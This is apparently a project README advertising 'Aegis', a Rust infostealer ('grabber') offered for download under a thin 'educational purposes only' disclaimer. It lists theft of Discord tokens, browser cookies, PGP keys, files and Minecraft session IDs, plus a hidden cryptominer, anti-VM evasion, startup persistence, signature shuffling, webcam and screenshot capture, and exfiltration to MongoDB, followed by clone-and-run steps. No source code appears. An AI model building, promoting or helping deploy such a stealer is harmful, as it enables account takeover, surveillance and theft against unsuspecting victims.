
# Aegis

Grabber made in Rust. Educational purposes only. I do not condone the use of this on any person as it can lead to legal trouble. 



## Features

- Grabs IP, Discord token, browser cookies, PGP keys, .txt files, Minecraft SSID & more
- BTC miner 
- Anti VM
- File pumper
- Screenshots desktops and takes webcam photo
- Hooks to startup processes
- File signature shuffling
- Double hooking
- Posting to MongoDB
- Custom .ico
- Trolling functions reminiscent of old generation viruses
## Usage/Examples

Run `git clone https://github.com/shoegazers/Aegis`, then ```cargo run```
Make sure you have the Rust language installed.
